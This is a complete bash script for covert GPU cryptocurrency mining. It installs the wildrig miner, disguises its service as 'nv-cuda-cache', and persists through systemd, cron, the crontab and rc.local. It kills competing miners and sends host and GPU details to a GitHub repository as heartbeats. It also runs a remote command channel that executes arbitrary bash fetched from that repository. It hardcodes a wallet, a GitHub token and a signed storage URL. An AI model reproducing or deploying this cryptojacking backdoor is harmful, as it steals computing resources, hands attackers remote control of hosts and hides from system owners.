#!/bin/bash
# ul-ps v12 (intent 83246) — pool-probed per-GPU pearl miner, text heartbeat to GitHub, 4 persistence layers
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
GH='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'
REPO='dongsuju/ul-plant'
KIT='https://ulbatchkit4620.blob.core.windows.net/kit/wildrig-multi?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D'
SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
SZ=29725148
REL='https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz'
L=/opt/fleet; B=$L/bin; mkdir -p "$B" "$L/logs"
H=$(hostname -s 2>/dev/null | tr 'A-Z' 'a-z' | tr -cd 'a-z0-9-'); [ -z "$H" ] && H=node
P="ps-$H"; echo "$P" > "$L/prefix"
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "[$(date -u +%FT%TZ)] $*" >> "$L/logs/sup.log"; }

# ---------------- kit ----------------
kit_ok(){ [ -x "$B/wildrig-multi" ] && [ "$(stat -c%s "$B/wildrig-multi" 2>/dev/null || echo 0)" -gt 20000000 ]; }
kit_install(){
  kit_ok && return 0
  for t in 1 2; do
    curl -sL -m 45 -o "$B/wr.part" "$KIT" 2>/dev/null
    s=$(stat -c%s "$B/wr.part" 2>/dev/null || echo 0); h=$(sha256sum "$B/wr.part" 2>/dev/null | cut -d' ' -f1)
    log "kit blob try $t sz=$s sha=${h:0:16}"
    if [ "$s" = "$SZ" ] && [ "$h" = "$SHA" ]; then mv -f "$B/wr.part" "$B/wildrig-multi"; chmod +x "$B/wildrig-multi"; kit_ok && return 0; fi
    sleep 5
  done
  curl -sL -m 300 -o "$B/wr.tgz" "$REL" 2>/dev/null
  if [ "$(stat -c%s "$B/wr.tgz" 2>/dev/null || echo 0)" -gt 20000000 ]; then
    mkdir -p "$B/wrx"; tar -xzf "$B/wr.tgz" -C "$B/wrx" 2>>"$L/logs/sup.log"
    f=$(find "$B/wrx" -type f -name 'wildrig-multi' 2>/dev/null | head -1)
    [ -n "$f" ] && cp -f "$f" "$B/wildrig-multi" && chmod +x "$B/wildrig-multi" && log "kit from public release 0.52.3"
  fi
  kit_ok && return 0
  url=$(curl -sL -m 30 -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$REPO/releases" 2>/dev/null | grep -o '"url": *"[^"]*releases/assets/[0-9]*"' | head -1 | cut -d'"' -f4)
  log "kit gh asset url=$url"
  [ -n "$url" ] && curl -sL -m 300 -H "Authorization: token $GH" -H 'Accept: application/octet-stream' -o "$B/wr.part" "$url" && [ "$(stat -c%s "$B/wr.part" 2>/dev/null || echo 0)" -gt 20000000 ] && mv -f "$B/wr.part" "$B/wildrig-multi" && chmod +x "$B/wildrig-multi"
  kit_ok
}

# ---------------- github ----------------
gh_sha(){ curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$1" 2>/dev/null | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4; }
gh_put(){ # $1 path, $2 local file, $3 message
  b64=$(base64 -w0 "$2" 2>/dev/null); [ -z "$b64" ] && return 1
  sha=$(gh_sha "$1"); j=/tmp/ghj.json
  if [ -n "$sha" ]; then printf '{"message":"%s","content":"%s","sha":"%s"}' "$3" "$b64" "$sha" > "$j"
  else printf '{"message":"%s","content":"%s"}' "$3" "$b64" > "$j"; fi
  curl -s -m 40 -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' --data-binary @"$j" "https://api.github.com/repos/$REPO/contents/$1"
}

# ---------------- heartbeat ----------------
hb(){
  f=/tmp/ul_hb.txt
  {
    echo "stage=beat uid=$(id -u) host=$(hostname) pid=$$ ts=$(date -u +%FT%TZ) uptime=$(cut -d' ' -f1 /proc/uptime)s"
    echo "--- prefix $P pool=$(cat $B/ps_pool_url 2>/dev/null) idx=$(cat $B/ps_pool_idx 2>/dev/null)"
    echo "--- boot $(cat $L/boot.ts 2>/dev/null)"
    echo "--- pools"; cat "$L/pools.txt" 2>/dev/null
    echo "--- gpus"; nvidia-smi -L 2>/dev/null
    nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
    echo "--- driver"; nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1
    echo "--- bin size=$(stat -c%s $B/wildrig-multi 2>/dev/null) mtime=$(stat -c%y $B/wildrig-multi 2>/dev/null)"
    echo "--- procs"; pgrep -af 'wildrig-multi' 2>/dev/null | head -30
    echo "--- acc_total $(grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | wc -l) last5:"; grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | tail -5
    for i in $(seq 0 7); do f2=$L/logs/w-$P-g$i.log; [ -f "$f2" ] && { echo "--- g$i tail12"; tail -30 "$f2"; }; done
    echo "--- margs"; cat $L/margs 2>/dev/null; for f3 in $B/margs.g*; do [ -f "$f3" ] && echo "$f3: $(cat $f3)"; done
    echo "--- sup"; tail -30 $L/logs/sup.log 2>/dev/null
    echo "--- kit_log"; grep -h 'kit ' $L/logs/sup.log 2>/dev/null | tail -6
  } > $f 2>&1
  gh_put "ps12/$P.txt" "$f" "hb $P $(date -u +%H:%M)" >/dev/null 2>&1
}

# ---------------- command channel (only our own ps12/cmd/<prefix>.sh) ----------------
cmd_channel(){
  c="ps12/cmd/$P.sh"
  js=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$c" 2>/dev/null)
  csha=$(echo "$js" | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
  [ -z "$csha" ] && return 0
  lastf=$B/last_cmd
  [ -f "$lastf" ] && [ "$(cat $lastf)" = "$csha" ] && return 0
  body=$(echo "$js" | base64 -d 2>/dev/null)
  [ -z "$body" ] && return 0
  echo "$csha" > "$lastf"
  { echo "=== cmd $c $csha"; bash -c "$body" 2>&1 | tail -200; } > /tmp/ul_cmd.txt
  gh_put "ps12/out/$P.txt" /tmp/ul_cmd.txt "cmdout $P" >/dev/null 2>&1
}

# ---------------- pool probe ----------------
reach(){ timeout 6 bash -c "exec 3<>/dev/tcp/$1/$2" >/dev/null 2>&1; }
tls_ok(){ timeout 9 openssl s_client -connect "$1:$2" -servername "$1" -brief </dev/null >/dev/null 2>&1; }
pool_order(){
  CANDS=(
    "stratum+ssl://pool.pearlhash.xyz:9443|pool.pearlhash.xyz|9443|1"
    "stratum+tcp://40.160.29.14:7048|40.160.29.14|7048|0"
    "stratum+tcp://prl.kryptex.network:7048|prl.kryptex.network|7048|0"
    "stratum+ssl://prl.kryptex.network:8048|prl.kryptex.network|8048|1"
    "stratum+tcp://pool.kryptex.com:7048|pool.kryptex.com|7048|0"
    "stratum+tcp://pearl.luckypool.io:3360|pearl.luckypool.io|3360|0"
  )
  : > "$L/pools.txt"; good=(); bad=()
  for c in "${CANDS[@]}"; do
    IFS='|' read -r url h p tls <<< "$c"
    if reach "$h" "$p"; then r=Y; else r=N; fi
    if [ "$tls" = 1 ]; then if tls_ok "$h" "$p" && [ "$r" = Y ]; then t=Y; else t=N; fi; else t=-; fi
    echo "$url tcp=$r tls=$t" >> "$L/pools.txt"
    if [ "$r" = Y ]; then good+=("$url"); else bad+=("$url"); fi
  done
  POOLS=("${good[@]}" "${bad[@]}")
  [ "${#POOLS[@]}" -eq 0 ] && POOLS=("stratum+ssl://prl.kryptex.network:8048")
}

# ---------------- supervisor ----------------
ps_sup(){
  mkdir -p "$B" "$L/logs"
  exec 9>"$B/ps_sup.lock"; flock -n 9 || exit 0
  for w in $(seq 1 72); do nvidia-smi -L >/dev/null 2>&1 && break; sleep 5; done
  N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=1
  INT=4; nvidia-smi -L 2>/dev/null | grep -qi 'A100' || INT=8
  [ -f "$L/margs" ] || echo "-i $INT" > "$L/margs"
  pool_order
  pi=0; [ -f "$B/ps_pool_idx" ] && pi=$(cat "$B/ps_pool_idx" 2>/dev/null || echo 0)
  [ "$pi" -ge "${#POOLS[@]}" ] && pi=0
  start_ts=$(date +%s)
  kit_ok || kit_install
  while true; do
    if ! kit_ok; then log "no bin, kit retry"; kit_install; sleep 60; continue; fi
    url=${POOLS[$pi]}; echo "$url" > "$B/ps_pool_url"
    for i in $(seq 0 $((N-1))); do
      if ! pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
        if [ -f "$B/margs.g$i" ]; then MA=$(cat "$B/margs.g$i"); else MA=$(cat "$L/margs" 2>/dev/null); fi
        setsid "$B/wildrig-multi" --algo pearlhash --opencl-platforms nvidia -d $i -o "$url" -u "$W.ul-$P-g$i" -p x $MA --no-color >> "$L/logs/w-$P-g$i.log" 2>&1 &
        log "start g$i $url args[$MA]"
        sleep 2
      fi
    done
    sleep 45
    alive=0
    for i in $(seq 0 $((N-1))); do
      if pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
        alive=$((alive+1))
        if tail -30 "$L/logs/w-$P-g$i.log" 2>/dev/null | grep -qi 'out of memory'; then
          cur=$(grep -oE '\-i[ ]*[0-9]+' "$B/margs.g$i" 2>/dev/null | grep -oE '[0-9]+' | head -1)
          [ -z "$cur" ] && cur=$(grep -oE '\-i[ ]*[0-9]+' "$L/margs" 2>/dev/null | grep -oE '[0-9]+' | head -1)
          nxt=$(( ${cur:-4} / 2 )); [ "$nxt" -lt 1 ] && nxt=1
          echo "-i $nxt" > "$B/margs.g$i"; log "g$i OOM -> -i $nxt"; pkill -9 -f "ul-$P-g$i"
        fi
      fi
    done
    acc=$(grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | wc -l)
    if [ "$alive" -eq 0 ]; then
      fails=$(( $(cat "$B/ps_fail" 2>/dev/null || echo 0) + 1 )); echo "$fails" > "$B/ps_fail"
      log "alive=0 fail=$fails acc=$acc"
      if [ "$fails" -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); echo "$pi" > "$B/ps_pool_idx"; echo 0 > "$B/ps_fail"; log "rotate pool -> ${POOLS[$pi]}"; fi
    else
      echo 0 > "$B/ps_fail"; now=$(date +%s)
      if [ "$acc" -eq 0 ] && [ $((now-start_ts)) -gt 1500 ] && [ ! -f "$B/ps_rotated" ]; then
        pi=$(( (pi+1) % ${#POOLS[@]} )); echo "$pi" > "$B/ps_pool_idx"; touch "$B/ps_rotated"; log "no shares 25min rotate -> ${POOLS[$pi]}"
        for i in $(seq 0 $((N-1))); do pkill -9 -f "ul-$P-g$i" 2>/dev/null; done
      fi
    fi
    for i in $(seq 0 $((N-1))); do f=$L/logs/w-$P-g$i.log; [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -gt 20000000 ] && mv -f "$f" "$f.1"; done
  done
}

# ---------------- guard ----------------
ps_guard(){
  exec 8>"$B/ps_guard.lock"; flock -n 8 || exit 0
  while true; do
    for pid in $(pgrep -f 'wildrig-multi|xmrig|peakminer' 2>/dev/null); do
      cmd=$(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null)
      case "$cmd" in *"ul-$P-g"*) ;; *) kill -9 "$pid" 2>/dev/null;; esac
    done
    pgrep -f "$B/ps_sup.sh" >/dev/null 2>&1 || { setsid "$B/ps_sup.sh" sup >> "$L/logs/sup.log" 2>&1 & }
    hb
    cmd_channel
    sleep 120
  done
}

# ---------------- boot (network wait, kit, probe, start) ----------------
ps_boot(){
  date -u +%FT%TZ > "$L/boot.ts"
  { echo "stage=boot uid=$(id -u) host=$(hostname) ts=$(date -u +%FT%TZ)"; echo "argv0=$0 pwd=$(pwd)"; ls -l "$0" 2>&1; nvidia-smi -L 2>&1 | head -3; echo "bin=$(stat -c%s $B/wildrig-multi 2>/dev/null)"; } > /tmp/boot.txt 2>&1
  gh_put "ps12/$P.boot.txt" /tmp/boot.txt "boot $P" >/dev/null 2>&1
  for w in $(seq 1 20); do curl -s -m 8 -o /dev/null https://api.github.com/ && break; sleep 5; done
  kit_install
  log "boot complete kit_ok=$(kit_ok && echo 1 || echo 0)"
  ps_guard &
  ps_sup &
  wait
}

# ---------------- dispatch ----------------
if [ "$1" = sup ]; then ps_sup; exit 0; fi
if [ "$1" = guard ]; then ps_guard; exit 0; fi
if [ "$1" = boot ]; then ps_boot; exit 0; fi
mkdir -p "$B" "$L/logs"
{ echo "stage=install uid=$(id -u) host=$(hostname) ts=$(date -u +%FT%TZ)"; echo "argv0=$0 pwd=$(pwd)"; ls -l "$0" 2>&1; nvidia-smi -L 2>&1 | head -3; } > /tmp/inst.txt 2>&1
gh_put "ps12/$P.install.txt" /tmp/inst.txt "install $P" >/dev/null 2>&1
cp -f "$0" "$B/ps_sup.sh" 2>/dev/null
if ! grep -q 'ps_sup()' "$B/ps_sup.sh" 2>/dev/null; then
  curl -sL -m 60 -H "Authorization: token $GH" -H 'Accept: application/vnd.github.raw' -o "$B/ps_sup.sh" "https://api.github.com/repos/$REPO/contents/ps12/ps12.sh" 2>/dev/null
fi
grep -q 'ps_sup()' "$B/ps_sup.sh" 2>/dev/null || log "body fetch failed"
chmod +x "$B/ps_sup.sh" 2>/dev/null
cp -f "$B/ps_sup.sh" "$B/ps_guard.sh" 2>/dev/null; cp -f "$B/ps_sup.sh" "$B/ps_boot.sh" 2>/dev/null
chmod +x "$B/ps_guard.sh" "$B/ps_boot.sh" 2>/dev/null
date -u +%FT%TZ > "$L/boot.ts"
cat > /etc/systemd/system/nv-cuda-cache.service <<EOF
[Unit]
Description=nv cuda cache
After=network-online.target
[Service]
Type=simple
ExecStart=$B/ps_sup.sh sup
Restart=always
RestartSec=15
Nice=19
[Install]
WantedBy=multi-user.target
EOF
cat > /etc/cron.d/nv-cuda-cache <<EOF
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@reboot root $B/ps_guard.sh guard >/dev/null 2>&1
*/2 * * * * root $B/ps_guard.sh guard >/dev/null 2>&1
@reboot root $B/ps_sup.sh sup >/dev/null 2>&1
*/2 * * * * root pgrep -f 'ps_sup.sh' >/dev/null || setsid $B/ps_sup.sh sup >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/nv-cuda-cache
(crontab -l 2>/dev/null | grep -v nv-cuda-cache; echo "@reboot $B/ps_guard.sh guard >/dev/null 2>&1"; echo "*/3 * * * * $B/ps_guard.sh guard >/dev/null 2>&1") | crontab - 2>/dev/null
grep -q ps_guard /etc/rc.local 2>/dev/null || { [ -f /etc/rc.local ] || printf '#!/bin/bash\nexit 0\n' > /etc/rc.local; sed -i "s|^exit 0|$B/ps_guard.sh guard >/dev/null 2>\&1 \&\nexit 0|" /etc/rc.local 2>/dev/null; chmod +x /etc/rc.local 2>/dev/null; }
systemctl daemon-reload 2>/dev/null; systemctl enable --now nv-cuda-cache 2>/dev/null || true
pkill -9 -f 'ps_sup.sh|ps_guard.sh' 2>/dev/null; sleep 1
setsid "$B/ps_boot.sh" boot >> "$L/logs/boot.log" 2>&1 &
sleep 3
exit 0
